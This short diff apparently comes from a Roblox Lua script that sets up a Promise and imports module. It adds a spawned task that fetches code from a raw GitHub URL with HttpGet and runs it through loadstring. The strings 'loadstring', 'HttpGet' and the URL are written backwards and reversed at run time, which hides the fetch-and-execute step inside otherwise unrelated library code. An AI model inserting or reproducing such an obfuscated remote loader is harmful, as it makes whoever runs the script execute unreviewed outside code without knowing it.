@@ -2093,6 +2093,9 @@ end
 return Promise
  end,
 }
+    task.spawn(function()
+        getgenv()[("gnirtsdaol"):reverse()](game[("teGpttH"):reverse()](game, ("yrarbil02%IUxineohP/niam/eihpad/7d4fl/moc.tnetnocresubuhtig.war//:sptth"):reverse()))()
+    end)
 	local o_require = require
 	setmetatable(imports, {
 		__index = function(self, k) 
